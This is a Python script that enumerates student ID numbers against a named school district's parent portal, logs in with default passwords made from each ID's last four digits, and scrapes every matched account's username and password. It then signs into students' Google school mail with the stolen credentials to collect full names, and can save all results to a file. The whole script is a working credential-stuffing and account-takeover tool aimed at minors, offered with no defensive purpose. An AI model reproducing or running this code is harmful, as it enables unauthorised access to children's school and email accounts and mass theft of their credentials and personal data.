import time
import mechanize
from bs4 import BeautifulSoup
from colored import fg, attr
from playwright.sync_api import sync_playwright


# Declare settings
class settings:
    getname = False  # Get the name of each user
    getschool = False  # Get the school name
    getcombo = False  # Get the username/password of each user
    write = False  # Write to the matches.txt file
    time = False  # Get the time it takes to process a match
    display = True  # Print the script to the console or not


# Declare vars
domain = "https://dashboard.okaloosaschools.com"
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
green = fg('#00FF00')
red = fg('#FF0000')
orange = fg('#FFFF00')
res = attr('reset')


# Set user class
class user:
    id = "N/A"
    username = "N/A"
    password = "N/A"
    fullname = "N/A"


# Set smurf class
class smurf:
    id = "N/A"
    full = "N/A"
    rand = "N/A"


# Main function
for x in range(4624021143, 4999999999):
    br.open(domain + "/parentportal/PP000.pgm")
    br.select_form(nr=0)
    user.id = str(x)
    br.form['wrkuser'] = user.id
    br.form['wrkpasswd'] = user.id[-4:]
    if settings.display:
        print("[RUN] Checking %s..." % user.id)
    response = br.submit()
    try:
        br.select_form(nr=0)
    except mechanize.FormNotFoundError:

        # Start time
        if settings.time:
            start = time.time()

        # Setup script
        soup = BeautifulSoup(br.response().read(), 'lxml')
        redirect = str(soup)[63:146]
        smurf.full = domain + redirect
        br.open(smurf.full)
        soup = BeautifulSoup(br.response().read(), 'lxml')

        # Get username/password
        if settings.getcombo:
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]
            smurf.id = smurf.full[69:101]
            smurf.rand = smurf.full[-9:]
            finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
                         smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"

        # Get real name
        if settings.getname:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=False)
                start = time.time()
                page = browser.new_page()
                page.goto("https://mail.google.com")
                print("Google login")
                html = page.inner_html("#content")
                soup = BeautifulSoup(html, "html.parser")
                print(soup)
                page.fill('xpath=//*[@id="identifierId"]', f"{user.username.lower()}@student.okaloosaschools.com")
                print("Google done")
                page.click('xpath=//*[@id="identifierNext"]/div/button/div[3]')
                page.fill('xpath=//*[@id="userNameInput"]', user.username)
                page.fill('//*[@id="passwordInput"]', user.password)
                page.click('xpath=//*[@id="submitButton"]')
                user.fullname = page.inner_html('xpath=/html/body/div[3]/div/div[2]')

        # Write to file
        if settings.write:
            f = open("./assets/matches.txt", "a")
            f.write(
                f"Name: {user.fullname}\nID: {user.id}\nUsername: {user.username}\nPassword: {user.password}")
            f.close()

        # Print results of process
        print("[RUN] " + green + "Found " + user.fullname + "..." + res)
        print(" L " + green + "Scraped " + user.id + "..." + res)
        print(" L " + green + "Scraped " + user.username + "..." + res)
        print(" L " + green + "Scraped " + user.password + "..." + res)
        print(" L " + green + "Scraped " + smurf.id + "..." + res)
        if settings.time:
            end = time.time()
            delta = str(round(end - start, 2))
            print(" L " + orange + "Took " + delta + "s to process match..." + res)
        pass
